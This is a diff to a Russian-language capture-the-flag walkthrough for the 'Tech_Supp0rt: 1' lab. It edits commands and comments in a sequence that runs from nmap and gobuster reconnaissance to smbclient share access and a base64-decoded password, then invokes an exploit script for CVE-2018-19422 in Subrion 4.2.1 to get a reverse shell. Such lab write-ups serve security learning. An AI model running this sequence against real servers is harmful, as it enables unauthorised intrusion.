@@ -70,9 +70,7 @@ cat root.txt
 ## 2. Tech_Supp0rt: 1
 Идея - 
 ```bash
-nmap -sC -sV -oN nmap/initial MACHINE_IP
-
-sudo apt-get install gobuster
+nmap -sC -sV -oN MACHINE_IP
 
 # Перебор скрытых директрий
 gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -80,7 +78,7 @@ gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-li
 # Получения списка доступных общих ресурсов на SMB-сервере (windows-совместимый файловый обмен)
 smbclient -L MACHINE_IP
 
-# Подключаемся к websvr и достаем оттуда какой-то enter.txt
+# Подключаемся к websvr и достаем оттуда какой-то подозрительный enter.txt
 smbclient //10.10.59.1/websvr
 ls -l
 get enter.txt
@@ -90,10 +88,9 @@ exit
 cat enter.txt
 
 # Дешифруем пароль из base64, получаем Scam2021
-# Ищем уязвимости в версии subrion 4.2.1
-searchsploit subrion 4.2.1
+# Скамеры используют subrion 4.2.1, но там есть уязвимости
 
-# Эксплойтим уязвимость CVE-2018-19422 (reverse shell )
+# Эксплойтим уязвимость CVE-2018-19422 (reverse shell)
 sudo python3 49876.py -u http://MACHINE_IP/subrion/panel/ -l admin -p Scam2021
 
 ls /home
